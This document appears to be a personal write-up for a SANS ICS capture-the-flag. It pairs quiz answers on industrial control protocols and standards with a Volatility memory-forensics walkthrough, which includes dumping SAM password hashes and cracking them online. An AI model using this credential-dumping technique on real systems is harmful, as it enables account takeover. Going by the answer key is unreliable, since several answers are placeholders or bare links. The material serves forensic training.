# Questions

What is the name of the DHS CISA stand-alone desktop application that guides asset owners and operators through a systematic process of evaluating Operational Technology and Information Technology?

https://www.cisa.gov/tools-and-resources

https://us-cert.cisa.gov/ics/Downloading-and-Installing-CSET
https://github.com/cisagov/cset/releases

->CSET

You are troubleshooting a PLC ladder diagram program and you see an Output Latch (OTL) instruction. You see that the logic prior to the OTL instruction is logically false and yet the OTL coil is “On" or “True”.

What type of instruction should you search for within the ladder logic to see how the OTL instruction is turned off?
https://www.solisplc.com/tutorials/plc-programming-fundamentals-otl-instruction

https://home.isr.uc.pt/~lino/AIR/Arquivo/PLC_Tutor/latch.htm
https://www.courses.psu.edu/e_met/e_met430_jar14/instr/otl_otu.html

-> Unlatch

What is the Bitwise Exclusive (XOR) of the following binary numbers? 00001101 multiplied by 10000101

Provide your answer including all eight bits including leading zeros if any.

Answer format: ########
->               10001000


At what level in the Purdue Model are Field Devices located?
https://ics.sans.org/media/control-systems-are-a-target-poster.pdf
-> 0


In 1903, Italian radio pioneer, Guglielmo Marconi's presentation of secure long-distance wireless communications was hacked during the live demonstration. What language was used for this hack?
https://hackaday.com/2017/03/02/great-hacks-of-history-the-marconi-radio-hack-1903/
-> Morse

Which IEC 61131-3 programming language was originally designed to document the design and construction relay racks as used in manufacturing and process control?
-> https://en.wikipedia.org/wiki/Ladder_logic

In 2021, what remote access software was used to access the Oldsmar, FL water facility and change chemical levels?
-> teamviewer

According to the IEC / ISA 62443 standards Security Assurance Levels, protection against intentional violation by threat actors with system specific skills and high motivation requires which authentication control?

The levels are:

    Security Level 0: No special requirement or protection required.
    Security Level 1: Protection against unintentional or accidental misuse.
    Security Level 2: Protection against intentional misuse by simple means with few resources, general skills and low motivation.
    Security Level 3: Protection against intentional misuse by sophisticated means with moderate resources, IACS-specific knowledge and moderate motivation.
    Security Level 4: Protection against intentional misuse using sophisticated means with extensive resources, IACS-specific knowledge and high motivation.
level4
-> multifactor
https://www.isasecure.org/en-US/Documents/Articles-and-Technical-Papers/2018-IEC-62443-and-ISASecure-Overview_Suppliers-Pe

As defined in the NIST 800-82r2, what are the first steps in implementing an information security program for ICS.
https://csrc.nist.gov/publications/detail/sp/800-82/rev-2/final
https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-82r2.pdf

-> Develop a business case for security then build and train a cross-functional team

According to the US Department of Homeland Security, all government agencies must report an incident to CISA if they locate a Solar Winds DLL.

What is the MD5 file hash for this DLL?
https://cyber.dhs.gov/ed/21-01/
->b91ce2fa41029f6955bff20079468448


The MITRE ATT&CK for ICS Matrix defines tactics and techniques that are commonly used by attackers to obtain their goals. ARP Spoofing is an attack that has been used to cause loss of view and control in several documented attacks.

A MITM attack may allow an adversary to perform the following attacks:

-> Block Reporting Message, Spoof Reporting Message, Modify Parameter, Unauthorized Command Message
MitM is Technique ID T0830
https://collaborate.mitre.org/attackics/index.php/Technique/T0830

What is the Highway Addressable Remote Transducer Protocol manufacturer identification code for Sierra Instruments?

https://support.fieldcommgroup.org/en/support/solutions/articles/8000083841-current-list-of-hart-manufacturer-id-codes
->0x0000A5

You examine the following Modus TCP transmission.
6e8b 0000 0006 0101 0001 0002

What is the Transaction Identifier?

https://www.prosoft-technology.com/kb/assets/intro_modbustcp.pdf

-> 6e8b

When programming a PLC you decide to set bit zero of a Word to a value of 1. You want to move the value of 1 to the next higher bit as the machine changes state.

You decide to use the following instruction to move the value of 1 to the next higher bit.


    Bit Shift Left (BSL)
    Bit Shift Right (BSR)
    Exclusive Or (XOR)
    Set System Value (SSV)


-> BSL

Using the following image from a network packet capture displayed in Wireshark, identify the IP a ddress of the Modbus field device.

-> ip

You are working in an automation cabinet and see a Rockwell Automation GuardLogix PLC. You know these types of PLC’s have certified safety instructions.

As of September, 2020, how many Ladder Diagram safety instructions does the Rockwell Automation GuardLogix Safety Application Instruction Set have available?

-> https://literature.rockwellautomation.com/idc/groups/literature/documents/rm/1756-rm095_-en-p.pdf


What IEC standard includes MMS and GOOSE messages?
-> https://en.wikipedia.org/wiki/IEC_61850

Function Block (FB) programming is popular with continuous process applications.

When a function block executes, which variables are evaluated?

    input variables and output variables
    input variables only
    input variables, internal variables, and output variables
    internal variables before input variables

-> input, internal et output

During the 2015 attack on the Ukrainian power grid, attackers modified and downloaded malicious firmware to which device?
-> https://ics.sans.org/media/E-ISAC_SANS_Ukraine_DUC_5.pdf


The following image displays a packet capture of HART traffic. The HART data is highlighted. Within the highlighted data, what is the value checksum?
-> hart protocol https://learnprotocols.wordpress.com/category/hart-protocol/


With Proportional, Integral and Derivative (PID) control, the difference between the desired final output and the actual output is referred to as the ______.

    Integral windup
    Loop Cycle
    Steady State Error
    Ziegler-Nichols

-> error
https://en.wikipedia.org/wiki/PID_controller



## Level 2


In the Open Systems Interconnection (OSI) model, the Common Industrial Protocol (CIP) operates at the ________ layer?

    Application
    Data Link
    Network
    Transport

-> application https://www.odva.org/wp-content/uploads/2020/05/PUB00138R6-Tech-Series-EtherNetIP.pdf



Implementing OPC Unified Architecture (UA) is preferred over OPC Data Access (DA) because:

    OPC DA is experimental and has not been approved for use in production environments
    OPC DA purchasing and maintenance licenses are more expensive than OPC UA
    OPC DA uses Windows DCOM, which introduces vulnerabilities into the control network
    OPC UA reduces network traffic by over 74 % and CPU utilization by 58%

-> UA extend DA with abstraction. DA uses Windows dcom, UA no.
https://opcfoundation.org/about/opc-technologies/opc-ua/



## evtx

pip install python-evtx

python3 evtx_dump.py ../level2b/Application.evtx > Application.log


## modbus
https://www.simplymodbus.ca/FC03.htm


## opc
https://reference.opcfoundation.org/v104/Core/docs/Part6/7.1.2/


## LEVEL 3

volatility installation 
https://www.volatilityfoundation.org/releases

```
./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw imageinfo

./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw --profile=Win7SP1x64 psxview

Offset(P)          Name                    PID pslist psscan thrdproc pspcid csrss session deskthrd ExitTime
------------------ -------------------- ------ ------ ------ -------- ------ ----- ------- -------- --------
0x000000007e495b00 services.exe            488 True   False  False    True   True  True    False    
0x000000007df5db00 VGAuthService.         2116 True   False  False    True   True  True    True     
0x000000007e4e2b00 lsass.exe               504 True   False  False    True   True  True    False    
0x000000007d911670 rslinx.exe             3508 True   False  False    True   True  True    False    
0x000000007da775f0 daq.exe                1848 True   False  False    True   True  True    True     
0x000000007e0fe870 FTLoginLogout.         1960 True   False  False    True   True  True    False    
0x000000007f9cdb00 UsbCipHelper.e         2032 True   False  False    True   True  True    False    
0x000000007e2f4b00 dwm.exe                1124 True   False  False    True   True  True    False    
0x000000007d92fb00 qoerutrrxnn.ex         5908 True   False  False    True   True  True    False    
0x000000007e27e710 svchost.exe             752 True   False  False    True   True  True    True     
0x000000007df2eb00 raOSGi.exe             2332 True   False  False    True   True  True    True     
0x000000007db6a5f0 conhost.exe            6060 True   False  False    True   True  True    True     
0x000000007d862b00 LogixDesigner.         5512 True   False  False    True   True  True    False    
0x000000007dc601c0 CodeMeter.exe          2444 True   False  False    True   True  True    True     
0x000000007d88fb00 msdtc.exe              4000 True   False  False    True   True  True    True     
0x000000007dfa5b00 vmtoolsd.exe           2184 True   False  False    True   True  True    True     
0x000000007ee60a20 WmiPrvSE.exe           3984 True   False  False    True   True  True    True     
0x000000007ded0b00 RNADiagnostics         1520 True   False  False    True   True  True    True     
0x000000007dd2b280 conhost.exe            2700 True   False  False    True   True  True    True     
0x000000007dcf92c0 lmgrd.exe              2640 True   False  False    True   True  True    True     
0x000000007e191b00 svchost.exe            4828 True   False  False    True   True  True    False    
0x000000007e5f0710 svchost.exe             884 True   False  False    True   True  True    True     
0x000000007e5932a0 svchost.exe             736 True   False  False    True   True  True    True     
0x00000000370157f0 RSOBSERV.EXE           2620 True   False  False    True   True  True    True     
0x000000007dcb3b00 EventClientMul         2560 True   False  False    True   True  True    True     
0x000000007e492440 winlogon.exe            432 True   False  False    True   True  True    True     
0x000000007df1ab00 RSLinxNG.exe            788 True   False  False    True   True  True    True     
0x000000007dd404c0 lmgrd.exe              2740 True   False  False    True   True  True    True     
0x000000007e3249b0 svchost.exe            1224 True   False  False    True   True  True    True     
0x000000007f591060 RnaAeServer.ex         3384 True   False  False    True   True  True    True     
0x000000007deb25c0 RdcyHost.exe           1412 True   False  False    True   True  True    True     
0x000000007dd17b00 FTActivationBo         2692 True   False  False    True   True  True    True     
0x000000007e30b600 sppsvc.exe             4552 True   False  False    True   True  True    True     
0x000000007e1d8b00 FTSysDiagSvcHo         1828 True   False  False    True   True  True    True     
0x000000007e5a6750 ramkMsgKernelS         1968 True   False  False    True   True  True    True     
0x000000007e1aab00 FTAE_HistServ.         1792 True   False  False    True   True  True    True     
0x000000007e1f9b00 NmspHost.exe           1884 True   False  False    True   True  True    True     
0x000000007df24330 mscorsvw.exe           4664 True   False  False    True   True  True    True     
0x000000007e5465c0 svchost.exe             600 True   False  False    True   True  True    True     
0x000000007e56f860 svchost.exe             676 True   False  False    True   True  True    True     
0x000000007f36d460 SearchFilterHo         5340 True   False  False    True   True  True    True     
0x000000007df32060 conhost.exe            2348 True   False  False    True   True  True    True     
0x0000000025a84750 notepad.exe            3844 True   False  False    True   True  True    False    
0x000000007daa74f0 RnaDirServer.e         3148 True   False  False    True   True  True    True     
0x000000007dbcdb00 conhost.exe            4960 True   False  False    True   True  True    False    
0x000000007f6b9530 memory.exe             4984 True   False  False    True   True  True    True     
0x000000007e4e1850 lsm.exe                 512 True   False  False    True   True  True    False    
0x000000007e11eb00 CodeMeterCC.ex         1644 True   False  False    True   True  True    False    
0x000000007d847b00 audiodg.exe            4452 True   False  False    True   True  True    True     
0x000000007f35b460 SearchProtocol         5060 True   False  False    True   True  True    True     
0x000000007d611b00 powershell.exe         6004 True   False  False    True   True  True    False    
0x000000007df3c5f0 RsvcHost.exe           1764 True   False  False    True   True  True    True     
0x000000007e480b00 FTAEArchiver.e         1748 True   False  False    True   True  True    True     
0x000000007dce0b00 WmiPrvSE.exe           2596 True   False  False    True   True  True    True     
0x000000007dd0d570 mmc.exe                3124 True   False  False    True   True  True    False    
0x000000007dac1b00 RNADirMultiple         3220 True   False  False    True   True  True    True     
0x000000007e2fdb00 spoolsv.exe            1156 True   False  False    True   True  True    True     
0x000000007e463060 wininit.exe             384 True   False  False    True   True  True    True     
0x000000007e0f8550 EventServer.ex         1584 True   False  False    True   True  True    True     
0x000000007e0fab00 vmtoolsd.exe           1604 True   False  False    True   True  True    False    
0x000000007e0e1600 vm3dservice.ex         1552 True   False  False    True   True  True    False    
0x000000007d865710 dllhost.exe            3888 True   False  False    True   True  True    True     
0x000000007e5c5b00 svchost.exe             812 True   False  False    True   True  True    True     
0x000000007e0883f0 svchost.exe            1488 True   False  False    True   True  True    True     
0x000000007e306b00 explorer.exe           1184 True   False  False    True   True  True    False    
0x000000007dbe5b00 SearchIndexer.         3704 True   False  False    True   True  True    True     
0x000000007db2d9b0 RnaAlarmMux.ex         3420 True   False  False    True   True  True    True     
0x000000007e5e7b00 svchost.exe             860 True   False  False    True   True  True    True     
0x000000007e323060 taskhost.exe           1208 True   False  False    True   True  True    False    
0x000000007dd745f0 flexsvr.exe            2816 True   False  False    True   True  True    True     
0x0000000030989b00 svchost.exe            3972 True   False  False    True   True  True    True     
0x000000007e5a4060 ActivationNoti         1976 True   False  False    True   True  True    False    
0x000000007e913b00 csrss.exe               332 True   False  False    True   False True    True     
0x000000007df50060 Launcher.exe           4496 True   False  False    True   False True    False    2021-01-28 15:31:47 UTC+0000
0x000000007ff6d9b0 System                    4 True   False  False    True   False False   False    
0x000000007eed5060 smss.exe                324 True   False  False    True   False True    False    2021-01-28 15:17:26 UTC+0000
0x000000007e432b00 csrss.exe               396 True   False  False    True   False True    True     
0x000000007f1cf2e0 smss.exe                248 True   False  False    True   False False   False    
0x000000007e45f2f0 smss.exe                376 True   False  False    True   False True    False    2021-01-28 15:17:26 UTC+0000
0x000000007e2e6b00 userinit.exe           1108 True   False  False    True   False True    False    2021-01-28 15:17:57 UTC+0000
0x000000004ee42b00 CompMgmtLaunch         4900 True   False  False    True   False True    False    2021-01-28 15:41:57 UTC+0000
0x000000007e108b00 runonce.exe            1616 True   False  False    True   False True    False    2021-01-28 15:17:32 UTC+0000
0x0000000009864cc0                           0 False  False  False    False  False False   True     
0x000000007f2e3460 dllhost.exe            5624 False  False  False    False  False True    False    2021-01-28 16:02:48 UTC+0000


./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw --profile=Win7SP1x64 pstree 
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa80018ae9b0:System                              4      0     90    598 2021-01-28 15:17:23 UTC+0000
. 0xfffffa80027cf2e0:smss.exe                         248      4      2     29 2021-01-28 15:17:23 UTC+0000
.. 0xfffffa80028d5060:smss.exe                        324    248      0 ------ 2021-01-28 15:17:25 UTC+0000
... 0xfffffa8003263060:wininit.exe                    384    324      3     76 2021-01-28 15:17:26 UTC+0000
.... 0xfffffa80032e1850:lsm.exe                       512    384     10    160 2021-01-28 15:17:27 UTC+0000
.... 0xfffffa8003295b00:services.exe                  488    384     10    291 2021-01-28 15:17:27 UTC+0000
..... 0xfffffa80039a5b00:vmtoolsd.exe                2184    488     11    289 2021-01-28 15:17:34 UTC+0000
..... 0xfffffa8003d2d9b0:RnaAlarmMux.ex              3420    488     22    252 2021-01-28 15:17:47 UTC+0000
..... 0xfffffa800391ab00:RSLinxNG.exe                 788    488     31    627 2021-01-28 15:17:33 UTC+0000
..... 0xfffffa80034fdb00:spoolsv.exe                 1156    488     13    268 2021-01-28 15:17:29 UTC+0000
..... 0xfffffa8003af92c0:lmgrd.exe                   2640    488      3     69 2021-01-28 15:17:37 UTC+0000
...... 0xfffffa8003b404c0:lmgrd.exe                  2740   2640      2    116 2021-01-28 15:17:37 UTC+0000
....... 0xfffffa8003b745f0:flexsvr.exe               2816   2740      4    146 2021-01-28 15:17:38 UTC+0000
..... 0xfffffa800392eb00:raOSGi.exe                  2332    488     81    696 2021-01-28 15:17:35 UTC+0000
..... 0xfffffa8003e65710:dllhost.exe                 3888    488     13    188 2021-01-28 15:17:53 UTC+0000
..... 0xfffffa80036f8550:EventServer.ex              1584    488     16    151 2021-01-28 15:17:30 UTC+0000
..... 0xfffffa800336f860:svchost.exe                  676    488      9    379 2021-01-28 15:17:27 UTC+0000
..... 0xfffffa8003924330:mscorsvw.exe                4664    488      6    103 2021-01-28 15:19:53 UTC+0000
..... 0xfffffa80037f9b00:NmspHost.exe                1884    488      5    104 2021-01-28 15:17:31 UTC+0000
..... 0xfffffa80038b25c0:RdcyHost.exe                1412    488     16    246 2021-01-28 15:17:32 UTC+0000
..... 0xfffffa80033c5b00:svchost.exe                  812    488     17    408 2021-01-28 15:17:27 UTC+0000
...... 0xfffffa80034f4b00:dwm.exe                    1124    812      5    152 2021-01-28 15:17:28 UTC+0000
..... 0xfffffa8003de5b00:SearchIndexer.              3704    488     13    982 2021-01-28 15:17:53 UTC+0000
...... 0xfffffa800255b460:SearchProtocol             5060   3704      8    280 2021-01-28 16:02:26 UTC+0000
...... 0xfffffa800256d460:SearchFilterHo             5340   3704      5     95 2021-01-28 16:02:26 UTC+0000
..... 0xfffffa8003523060:taskhost.exe                1208    488      9    264 2021-01-28 15:17:29 UTC+0000
..... 0xfffffa80042b57f0:RSOBSERV.EXE                2620    488      6    120 2021-01-28 15:31:54 UTC+0000
..... 0xfffffa80037aab00:FTAE_HistServ.              1792    488      8    177 2021-01-28 15:17:31 UTC+0000
..... 0xfffffa800395db00:VGAuthService.              2116    488      3     87 2021-01-28 15:17:34 UTC+0000
..... 0xfffffa8003e8fb00:msdtc.exe                   4000    488     12    145 2021-01-28 15:17:53 UTC+0000
..... 0xfffffa80035249b0:svchost.exe                 1224    488     19    316 2021-01-28 15:17:29 UTC+0000
..... 0xfffffa8003a601c0:CodeMeter.exe               2444    488     13    234 2021-01-28 15:17:35 UTC+0000
..... 0xfffffa8003cc1b00:RNADirMultiple              3220    488     28    344 2021-01-28 15:17:46 UTC+0000
..... 0xfffffa8003c775f0:daq.exe                     1848    488     19    220 2021-01-28 15:17:44 UTC+0000
..... 0xfffffa80036883f0:svchost.exe                 1488    488     10    147 2021-01-28 15:17:29 UTC+0000
..... 0xfffffa8003b17b00:FTActivationBo              2692    488     10    234 2021-01-28 15:17:37 UTC+0000
..... 0xfffffa80038d0b00:RNADiagnostics              1520    488      7    214 2021-01-28 15:17:33 UTC+0000
..... 0xfffffa8003ab3b00:EventClientMul              2560    488     22    232 2021-01-28 15:17:36 UTC+0000
..... 0xfffffa8003791b00:svchost.exe                 4828    488     13    370 2021-01-28 15:19:58 UTC+0000
..... 0xfffffa80033465c0:svchost.exe                  600    488     12    377 2021-01-28 15:17:27 UTC+0000
...... 0xfffffa8003ae0b00:WmiPrvSE.exe               2596    600     10    304 2021-01-28 15:17:37 UTC+0000
...... 0xfffffa8002860a20:WmiPrvSE.exe               3984    600      8    235 2021-01-28 15:17:55 UTC+0000
..... 0xfffffa80037d8b00:FTSysDiagSvcHo              1828    488      6    104 2021-01-28 15:17:31 UTC+0000
..... 0xfffffa80033e7b00:svchost.exe                  860    488     22    654 2021-01-28 15:17:27 UTC+0000
..... 0xfffffa80033932a0:svchost.exe                  736    488     20    856 2021-01-28 15:17:27 UTC+0000
...... 0xfffffa8003e47b00:audiodg.exe                4452    736      6    132 2021-01-28 16:02:02 UTC+0000
..... 0xfffffa80033a6750:ramkMsgKernelS              1968    488     11    137 2021-01-28 15:17:31 UTC+0000
..... 0xfffffa800437bb00:svchost.exe                 3972    488     10    122 2021-01-28 15:29:44 UTC+0000
..... 0xfffffa800347e710:svchost.exe                  752    488     18    486 2021-01-28 15:17:28 UTC+0000
..... 0xfffffa80033f0710:svchost.exe                  884    488     39   1207 2021-01-28 15:17:27 UTC+0000
..... 0xfffffa800393c5f0:RsvcHost.exe                1764    488     17    242 2021-01-28 15:17:33 UTC+0000
..... 0xfffffa8003280b00:FTAEArchiver.e              1748    488      4     75 2021-01-28 15:17:31 UTC+0000
..... 0xfffffa8003ca74f0:RnaDirServer.e              3148    488     10    230 2021-01-28 15:17:45 UTC+0000
..... 0xfffffa800350b600:sppsvc.exe                  4552    488      4    150 2021-01-28 15:19:56 UTC+0000
..... 0xfffffa8002391060:RnaAeServer.ex              3384    488     20    237 2021-01-28 15:17:47 UTC+0000
.... 0xfffffa80032e2b00:lsass.exe                     504    384      7    688 2021-01-28 15:17:27 UTC+0000
... 0xfffffa8002f13b00:csrss.exe                      332    324      9    972 2021-01-28 15:17:26 UTC+0000
.... 0xfffffa8003932060:conhost.exe                  2348    332      2     34 2021-01-28 15:17:35 UTC+0000
.... 0xfffffa8003b2b280:conhost.exe                  2700    332      2     38 2021-01-28 15:17:37 UTC+0000
.. 0xfffffa800325f2f0:smss.exe                        376    248      0 ------ 2021-01-28 15:17:26 UTC+0000
... 0xfffffa8003232b00:csrss.exe                      396    376     10    541 2021-01-28 15:17:26 UTC+0000
.... 0xfffffa8003dcdb00:conhost.exe                  4960    396      2     53 2021-01-28 15:43:29 UTC+0000
.... 0xfffffa8003d6a5f0:conhost.exe                  6060    396      2     52 2021-01-28 16:02:43 UTC+0000
... 0xfffffa8003292440:winlogon.exe                   432    376      5    115 2021-01-28 15:17:26 UTC+0000
.... 0xfffffa80034e6b00:userinit.exe                 1108    432      0 ------ 2021-01-28 15:17:28 UTC+0000
..... 0xfffffa8003506b00:explorer.exe                1184   1108     34   1006 2021-01-28 15:17:29 UTC+0000
...... 0xfffffa80036e1600:vm3dservice.ex             1552   1184      2     40 2021-01-28 15:17:30 UTC+0000
...... 0xfffffa8003f11670:rslinx.exe                 3508   1184      8    285 2021-01-28 15:21:48 UTC+0000
...... 0xfffffa80020b9530:memory.exe                 4984   1184      2     46 2021-01-28 16:02:43 UTC+0000
...... 0xfffffa8003950060:Launcher.exe               4496   1184      0 ------ 2021-01-28 15:31:44 UTC+0000
....... 0xfffffa8003e62b00:LogixDesigner.            5512   4496     60    991 2021-01-28 15:31:47 UTC+0000
...... 0xfffffa8004011b00:powershell.exe             6004   1184      5    502 2021-01-28 15:43:29 UTC+0000
....... 0xfffffa8003f2fb00:qoerutrrxnn.ex            5908   6004      7    284 2021-01-28 15:44:11 UTC+0000
...... 0xfffffa8003708b00:runonce.exe                1616   1184      0 ------ 2021-01-28 15:17:30 UTC+0000
....... 0xfffffa80036fe870:FTLoginLogout.            1960   1616     15    201 2021-01-28 15:17:31 UTC+0000
....... 0xfffffa80033a4060:ActivationNoti            1976   1616      6    211 2021-01-28 15:17:31 UTC+0000
....... 0xfffffa8001fcdb00:UsbCipHelper.e            2032   1616      2     78 2021-01-28 15:17:31 UTC+0000
...... 0xfffffa800371eb00:CodeMeterCC.ex             1644   1184      3     92 2021-01-28 15:17:30 UTC+0000
...... 0xfffffa80036fab00:vmtoolsd.exe               1604   1184      8    206 2021-01-28 15:17:30 UTC+0000
...... 0xfffffa8004397750:notepad.exe                3844   1184      1     60 2021-01-28 15:45:08 UTC+0000
...... 0xfffffa8004316b00:CompMgmtLaunch             4900   1184      0 ------ 2021-01-28 15:41:57 UTC+0000
....... 0xfffffa8003b0d570:mmc.exe                   3124   4900     15    386 2021-01-28 15:41:57 UTC+0000

./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw --profile=Win7SP1x64 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a003239010 0x0000000040ff4010 \??\C:\System Volume Information\Syscache.hve
0xfffff8a006057010 0x0000000025889010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a00c7d2010 0x0000000021c50010 \SystemRoot\System32\Config\SECURITY
0xfffff8a00000f010 0x000000002d5d9010 [no name]
0xfffff8a000024010 0x000000002d624010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a000057410 0x000000002d597410 \REGISTRY\MACHINE\HARDWARE
0xfffff8a00148f2e0 0x0000000025f0b2e0 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a0014b7010 0x0000000025d2f010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a001653010 0x0000000021841010 \SystemRoot\System32\Config\SAM
0xfffff8a001749010 0x0000000015f9d010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a0017d7010 0x0000000015ecd010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a001884010 0x000000000d9c9010 \??\C:\Users\sans-ics-ctf\ntuser.dat
0xfffff8a001948010 0x0000000022d36010 \??\C:\Users\sans-ics-ctf\AppData\Local\Microsoft\Windows\UsrClass.dat



./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a001653010 >hashes.txt

where -y is for system, and -s for sam

```

Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sans-ics-ctf:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IPALITE:1001:aad3b435b51404eeaad3b435b51404ee:2b0fd3faca9a8acd5fdfff6ecae2c207:::

en utilisant https://crackstation.net/


pour administrator c' est : " * " 
et pour sans-ics-ctf c'est : " " 



```
./volatility_2.6_lin64_standalone -f SANS-ICS-CTF.raw --profile=Win7SP1x64 cmdline                                           1 ⨯
Volatility Foundation Volatility Framework 2.6
************************************************************************
System pid:      4
************************************************************************
smss.exe pid:    248
Command line : \SystemRoot\System32\smss.exe
************************************************************************
smss.exe pid:    324
************************************************************************
csrss.exe pid:    332
Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
************************************************************************
smss.exe pid:    376
************************************************************************
wininit.exe pid:    384
Command line : wininit.exe
************************************************************************
csrss.exe pid:    396
Command line : %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
************************************************************************
winlogon.exe pid:    432
Command line : winlogon.exe
************************************************************************
services.exe pid:    488
Command line : C:\Windows\system32\services.exe
************************************************************************
lsass.exe pid:    504
Command line : C:\Windows\system32\lsass.exe
************************************************************************
lsm.exe pid:    512
Command line : C:\Windows\system32\lsm.exe
************************************************************************
svchost.exe pid:    600
Command line : C:\Windows\system32\svchost.exe -k DcomLaunch
************************************************************************
svchost.exe pid:    676
Command line : C:\Windows\system32\svchost.exe -k RPCSS
************************************************************************
svchost.exe pid:    736
Command line : C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
************************************************************************
svchost.exe pid:    812
Command line : C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted
************************************************************************
svchost.exe pid:    860
Command line : C:\Windows\system32\svchost.exe -k LocalService
************************************************************************
svchost.exe pid:    884
Command line : C:\Windows\system32\svchost.exe -k netsvcs
************************************************************************
svchost.exe pid:    752
Command line : C:\Windows\system32\svchost.exe -k NetworkService
************************************************************************
userinit.exe pid:   1108
************************************************************************
dwm.exe pid:   1124
Command line : "C:\Windows\system32\Dwm.exe"
************************************************************************
spoolsv.exe pid:   1156
Command line : C:\Windows\System32\spoolsv.exe
************************************************************************
explorer.exe pid:   1184
Command line : C:\Windows\Explorer.EXE
************************************************************************
taskhost.exe pid:   1208
Command line : "taskhost.exe"
************************************************************************
svchost.exe pid:   1224
Command line : C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork
************************************************************************
svchost.exe pid:   1488
Command line : C:\Windows\System32\svchost.exe -k utcsvc
************************************************************************
vm3dservice.ex pid:   1552
Command line : "C:\Windows\System32\vm3dservice.exe" -u
************************************************************************
EventServer.ex pid:   1584
Command line : "C:\Program Files (x86)\Common Files\Rockwell\EventServer.exe"
************************************************************************
vmtoolsd.exe pid:   1604
Command line : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
************************************************************************
runonce.exe pid:   1616
************************************************************************
CodeMeterCC.ex pid:   1644
Command line : "C:\Program Files (x86)\CodeMeter\Runtime\bin\CodeMeterCC.exe" 
************************************************************************
FTAEArchiver.e pid:   1748
Command line : "C:\Program Files (x86)\Common Files\Rockwell\FTAEArchiver.exe"
************************************************************************
FTAE_HistServ. pid:   1792
Command line : "C:\Program Files (x86)\Common Files\Rockwell\FTAE_HistServ.exe"
************************************************************************
FTSysDiagSvcHo pid:   1828
Command line : "C:\Program Files (x86)\Common Files\Rockwell\FTSysDiagSvcHost.exe"
************************************************************************
NmspHost.exe pid:   1884
Command line : "C:\Program Files (x86)\Common Files\Rockwell\NmspHost.exe"
************************************************************************
FTLoginLogout. pid:   1960
Command line : "C:\Program Files (x86)\Common Files\Rockwell\FTLoginLogout.exe" -s
************************************************************************
ramkMsgKernelS pid:   1968
Command line : "C:\Program Files (x86)\Rockwell Software\Studio 5000\Common\V3\bin\ramkMsgKernelSvc.exe"
************************************************************************
ActivationNoti pid:   1976
Command line : "C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\Tools\ActivationNotifier.exe" 
************************************************************************
UsbCipHelper.e pid:   2032
Command line : "C:\Program Files\Rockwell Automation\UsbCipDriver\USBCIPHelper\UsbCipHelper.exe" 
************************************************************************
RdcyHost.exe pid:   1412
Command line : "C:\Program Files (x86)\Common Files\Rockwell\RdcyHost.exe"
************************************************************************
RNADiagnostics pid:   1520
Command line : "C:\Program Files (x86)\Common Files\Rockwell\RNADiagnosticsSrv.exe"
************************************************************************
RSLinxNG.exe pid:    788
Command line : "C:\Program Files (x86)\Rockwell Software\RSLinx Enterprise\RSLinxNG.exe" /service
************************************************************************
RsvcHost.exe pid:   1764
Command line : "C:\Program Files (x86)\Common Files\Rockwell\RsvcHost.exe"
************************************************************************
VGAuthService. pid:   2116
Command line : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
************************************************************************
vmtoolsd.exe pid:   2184
Command line : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
************************************************************************
raOSGi.exe pid:   2332
Command line : "C:\Program Files (x86)\Rockwell Software\Studio 5000\Common\V3\bin\raOSGi.exe" //RS//raOSGi
************************************************************************
conhost.exe pid:   2348
Command line : \??\C:\Windows\system32\conhost.exe "-2023674175-216658301667554745-233720127-8329567415132885526316858551319125506
************************************************************************
CodeMeter.exe pid:   2444
Command line : "C:\Program Files (x86)\CodeMeter\Runtime\bin\CodeMeter.exe"
************************************************************************
EventClientMul pid:   2560
Command line : "C:\Program Files (x86)\Common Files\Rockwell\EventClientMultiplexer.exe"
************************************************************************
WmiPrvSE.exe pid:   2596
Command line : C:\Windows\system32\wbem\wmiprvse.exe
************************************************************************
lmgrd.exe pid:   2640
Command line : "C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\lmgrd.exe"
************************************************************************
FTActivationBo pid:   2692
Command line : "C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\Tools\FTActivationBoost.exe"
************************************************************************
conhost.exe pid:   2700
Command line : \??\C:\Windows\system32\conhost.exe "-2033123829-1654620837-8121926721354053788-137409365-1098512985-612588114480075384
************************************************************************
lmgrd.exe pid:   2740
